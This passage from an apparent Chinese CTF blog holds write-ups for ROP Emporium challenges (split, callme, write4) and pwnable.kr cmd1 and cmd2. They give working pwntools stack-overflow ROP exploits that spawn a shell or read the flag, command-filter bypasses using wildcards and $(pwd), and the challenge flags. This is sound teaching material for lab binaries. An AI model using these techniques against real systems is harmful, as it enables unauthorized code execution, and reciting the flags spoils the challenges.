class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然就是ROP，调用system，传入<code>/bin/cat flag.txt</code>字符串地址了</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./split32'</span>)</span><br><span class="line">p = process(<span class="string">'./split32'</span>)</span><br><span class="line">sys_plt = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x28</span>+<span class="number">4</span>)+p32(sys_plt)+p32(<span class="number">0xdeadbeaf</span>)+p32(<span class="number">0x0804a030</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h3><p>只有一个传参的区别，找一下gadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ rabin2 -z split</span><br><span class="line">[strings]</span><br><span class="line">addr=0x004008a8 off=0x000008a8 ordinal=000 sz=22 section=.rodata string=split by ROP Emporium</span><br><span class="line">addr=0x004008be off=0x000008be ordinal=001 sz=7 section=.rodata string=64bits</span><br><span class="line">addr=0x004008c7 off=0x000008c7 ordinal=002 sz=8 section=.rodata string=Exiting</span><br><span class="line">addr=0x004008d0 off=0x000008d0 ordinal=003 sz=44 section=.rodata string=Contriving a reason to ask user for data...</span><br><span class="line">addr=0x004008fc off=0x000008fc ordinal=004 sz=3 section=.rodata string=&gt; </span><br><span class="line">addr=0x004008ff off=0x000008ff ordinal=005 sz=8 section=.rodata string=/bin/ls</span><br><span class="line">addr=0x00601060 off=0x00001060 ordinal=000 sz=18 section=.data string=/bin/cat flag.txt</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ ROPgadget --binary split --only "pop|ret" | grep "rdi"</span><br><span class="line">0x0000000000400883 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>IDA看下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Contriving a reason to ask user for data..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">96</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./split'</span>)</span><br><span class="line">p = process(<span class="string">'./split'</span>)</span><br><span class="line">sys_plt = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400883</span></span><br><span class="line">string_addr = <span class="number">0x601060</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi_ret)+p64(string_addr)+p64(sys_plt)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="pcallme">callme</span><a href="#pcallme" class="header-anchor">#</a></h2><h3><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/callme$ checksec callme32 </span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/callme/callme32'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>用IDA查看下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hope you read the instructions..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  callme_three(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  callme_two(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  callme_one(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了下，应该是构造ROP，分别调用<code>callme_one</code>,<code>callme_two</code>,<code>callme_three</code>，在<code>.so</code>文件中看到都是三个参数，得是1,2,3。所以为了维持栈平衡，需要找pop三次ret的gadget。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/callme$ ROPgadget --binary callme32 --only 'pop|ret' </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080488ab : pop ebp ; ret</span><br><span class="line">0x080488a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048579 : pop ebx ; ret</span><br><span class="line">0x080488aa : pop edi ; pop ebp ; ret</span><br><span class="line">0x080488a9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048562 : ret</span><br><span class="line">0x080486be : ret 0xeac1</span><br></pre></td></tr></table></figure><p>所以找到了gadget地址<code>0x080488a9</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./callme32'</span>)</span><br><span class="line">p = process(<span class="string">'./callme32'</span>)</span><br><span class="line">callme_one = elf.symbols[<span class="string">'callme_one'</span>]</span><br><span class="line">callme_two = elf.symbols[<span class="string">'callme_two'</span>]</span><br><span class="line">callme_three = elf.symbols[<span class="string">'callme_three'</span>]</span><br><span class="line">pop_pop_pop_ret = <span class="number">0x080488a9</span> </span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x28</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(callme_one)+p32(pop_pop_pop_ret)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(callme_two)+p32(pop_pop_pop_ret)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(callme_three)+p32(pop_pop_pop_ret)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h3><p>同上，只是参数传递不同，三个参数分别用<code>rdi、rsi、rdx</code>传递，所以找gadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/callme/callme$ ROPgadget --binary callme --only 'pop|ret' </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000401b1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401b1e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401b20 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401b22 : pop r15 ; ret</span><br><span class="line">0x0000000000401b1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401b1f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401900 : pop rbp ; ret</span><br><span class="line">0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</span><br><span class="line">0x0000000000401b23 : pop rdi ; ret</span><br><span class="line">0x0000000000401ab2 : pop rdx ; ret</span><br><span class="line">0x0000000000401b21 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000401ab1 : pop rsi ; pop rdx ; ret</span><br><span class="line">0x0000000000401b1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004017d9 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 14</span><br></pre></td></tr></table></figure><p>找到gadget地址<code>0x0000000000401ab0</code><br>构造exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./callme'</span>)</span><br><span class="line">p = process(<span class="string">'./callme'</span>)</span><br><span class="line">callme_one = elf.symbols[<span class="string">'callme_one'</span>]</span><br><span class="line">callme_two = elf.symbols[<span class="string">'callme_two'</span>]</span><br><span class="line">callme_three = elf.symbols[<span class="string">'callme_three'</span>]</span><br><span class="line">pop_pop_pop_ret = <span class="number">0x401ab0</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_pop_pop_ret)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(callme_one)</span><br><span class="line">payload += p64(pop_pop_pop_ret)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(callme_two)</span><br><span class="line">payload += p64(pop_pop_pop_ret)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(callme_three)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="pwrite4">write4</span><a href="#pwrite4" class="header-anchor">#</a></h2><p>考察任意地址写，举例如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop r1 </span><br><span class="line">pop r2 </span><br><span class="line">ret;（r1存地址，r2存信息）</span><br><span class="line">mov ptr [r1], r2 </span><br><span class="line">ret;（将r2的内容存入r1指向的地址）</span><br></pre></td></tr></table></figure><h3><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ checksec write432</span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/write4/write432'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ rabin2 -z write432</span><br><span class="line">[strings]</span><br><span class="line">addr=0x08048700 off=0x00000700 ordinal=000 sz=23 section=.rodata string=write4 by ROP Emporium</span><br><span class="line">addr=0x08048717 off=0x00000717 ordinal=001 sz=7 section=.rodata string=32bits</span><br><span class="line">addr=0x08048720 off=0x00000720 ordinal=002 sz=8 section=.rodata string=Exiting</span><br><span class="line">addr=0x08048728 off=0x00000728 ordinal=003 sz=41 section=.rodata string=Go ahead and give me the string already!</span><br><span class="line">addr=0x08048751 off=0x00000751 ordinal=004 sz=3 section=.rodata string=&gt; </span><br><span class="line">addr=0x08048754 off=0x00000754 ordinal=005 sz=8 section=.rodata string=/bin/ls</span><br><span class="line"></span><br><span class="line">6 strings</span><br></pre></td></tr></table></figure><p>用IDA看下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Go ahead and give me the string already!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有system，但是字符串不是我们想要的，如果可以改成调用<code>system('/bin/sh')</code>就好了，所以需要我们自己写入这个字符串。找一下任意地址写的gadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ ROPgadget --binary write432 --only "mov|pop|ret"</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08048547 : mov al, byte ptr [0xc9010804] ; ret</span><br><span class="line">0x08048670 : mov dword ptr [edi], ebp ; ret</span><br><span class="line">0x080484b0 : mov ebx, dword ptr [esp] ; ret</span><br><span class="line">0x080486db : pop ebp ; ret</span><br><span class="line">0x080486d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080483e1 : pop ebx ; ret</span><br><span class="line">0x080486da : pop edi ; pop ebp ; ret</span><br><span class="line">0x080486d9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804819d : ret</span><br><span class="line">0x080484fe : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 10</span><br></pre></td></tr></table></figure><p>看到地址<code>0x080486da</code>、<code>0x08048670</code>两条gadget满足需求。同时x86系统一次只能写入4个字节，故需要将字符串拆分 成两次分别写入<code>.data</code>段</p><p>构造exp如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os &#x3D; &#39;linux&#39;,arch &#x3D; &#39;i386&#39;, log_level &#x3D; &#39;debug&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;write432&#39;)</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;write432&#39;)</span><br><span class="line">pop_edi_pop_ebp_ret&#x3D;0x080486da</span><br><span class="line">mov_ptredi_ebp_ret&#x3D;0x08048670</span><br><span class="line">data_addr &#x3D; 0x0804a028 </span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x28+4)</span><br><span class="line">payload +&#x3D; p32(pop_edi_pop_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(data_addr)+&#39;&#x2F;bin&#39;</span><br><span class="line">payload +&#x3D; p32(mov_ptredi_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(pop_edi_pop_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(data_addr+4)+&#39;&#x2F;sh\x00&#39;</span><br><span class="line">payload +&#x3D; p32(mov_ptredi_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(elf.symbols[&#39;system&#39;])+p32(0xdeadbeaf)+p32(data_addr)</span><br><span class="line">p.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h3><p>区别在于传参，同时字符串<code>/bin/sh</code>只需要一次就可以完全写入<br>找下gadget</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~&#x2F;rop_emporium_all_challenges&#x2F;write4$ ROPgadget --binary write4 --only &quot;mov|pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret</span><br><span class="line">0x0000000000400821 : mov dword ptr [rsi], edi ; ret</span><br><span class="line">0x00000000004007ae : mov eax, 0 ; pop rbp ; ret</span><br><span class="line">0x0000000000400820 : mov qword ptr [r14], r15 ; ret</span><br><span class="line">0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400890 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400892 : pop r15 ; ret</span><br><span class="line">0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret</span><br><span class="line">0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop rbp ; ret</span><br><span class="line">0x0000000000400893 : pop rdi ; ret</span><br><span class="line">0x0000000000400891 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005b9 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 16</span><br></pre></td></tr></table></figure><p>可以看到<code>0x0000000000400820</code>与<code>0x0000000000400890</code>处的gadget满足要求</p><p>构造exp如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os &#x3D; &#39;linux&#39;,arch &#x3D; &#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;write4&#39;)</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;write4&#39;)</span><br><span class="line">data_addr &#x3D; 0x0000000000601050</span><br><span class="line">pop_r14_pop_r15_ret &#x3D; 0x0000000000400890</span><br><span class="line">mov_ptrr14_r15_ret &#x3D; 0x0000000000400820</span><br><span class="line">pop_rdi_ret &#x3D; 0x0000000000400893</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x20+8)</span><br><span class="line">payload +&#x3D; p64(pop_r14_pop_r15_ret)</span><br><span class="line">payload +&#x3D; p64(data_addr)</span><br><span class="line">payload +&#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">payload +&#x3D; p64(mov_ptrr14_r15_ret)</span><br><span class="line">payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">payload +&#x3D; p64(data_addr)</span><br><span class="line">payload +&#x3D; p64(elf.symbols[&#39;system&#39;])</span><br><span class="line">p.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>stack_overflow</category>
        <category>ROP_Emporium</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>stack overflow</tag>
        <tag>ROP Emporium</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— cmd2</title>
    <url>/bad1774.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Daddy bought me a system command shell.</span><br><span class="line">but he put some filters to prevent me from playing with it without his permission...</span><br><span class="line">but I wanna play anytime I want!</span><br><span class="line"></span><br><span class="line">ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh cmd2@pwnable.kr -p2222</code>，密码是cmd1的flag,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pcmd2-c">cmd2.c</span><a href="#pcmd2-c" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"="</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"PATH"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"export"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"/"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"`"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>** p;</span><br><span class="line">	<span class="keyword">for</span>(p=environ; *p; p++)	<span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	delete_env();</span><br><span class="line">	putenv(<span class="string">"PATH=/no_command_execution_until_you_become_a_hacker"</span>);</span><br><span class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">	system( argv[<span class="number">1</span>] );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>相对于cmd1，加强了过滤规则，主要是其中<code>/</code>的问题<br>可以在目录下使用<code>pwd</code>构造</p><p>其余的无差</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd2@ubuntu:/$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*'</span><br><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">pwd</span>)bin$(<span class="built_in">pwd</span>)cat $(<span class="built_in">pwd</span>)home$(<span class="built_in">pwd</span>)cmd2$(<span class="built_in">pwd</span>)f*</span></span><br><span class="line">FuN_w1th_5h3ll_v4riabl3s_haha</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>FuN_w1th_5h3ll_v4riabl3s_haha</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— cmd1</title>
    <url>/92a446ce.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy! what is PATH environment in Linux?</span><br><span class="line"></span><br><span class="line">ssh cmd1@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh cmd1@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pcmd1">cmd1</span><a href="#pcmd1" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>)!=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	putenv(<span class="string">"PATH=/thankyouverymuch"</span>);</span><br><span class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	system( argv[<span class="number">1</span>] );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>注意到：其中对输入的命令进行了过滤，去除了sh，tmp，flag字符</p><ol><li><p>cat方法<br>使用f*代替flag</p></li><li><p>grep方法<br>同上使用通配符</p></li><li><p>环境变量方法<br>建立环境变量，值为flag</p></li></ol><p>除此之外还可以有软链接，执行另一文件等</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd1@ubuntu:~$ ./cmd1 "/bin/cat f*"</span><br><span class="line">mommy now I get what PATH environment is for :)</span><br><span class="line">cmd1@ubuntu:~$ ./cmd1 "/bin/grep -Rn :"</span><br><span class="line">Binary file cmd1 matches</span><br><span class="line">flag:1:mommy now I get what PATH environment is for :)</span><br><span class="line">/bin/grep: .bash_history: Permission denied</span><br><span class="line">cmd1@ubuntu:~$ export f=flag</span><br><span class="line">cmd1@ubuntu:~$ ./cmd1 "/bin/cat \$f"</span><br><span class="line">mommy now I get what PATH environment is for :)</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>mommy now I get what PATH environment is for :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
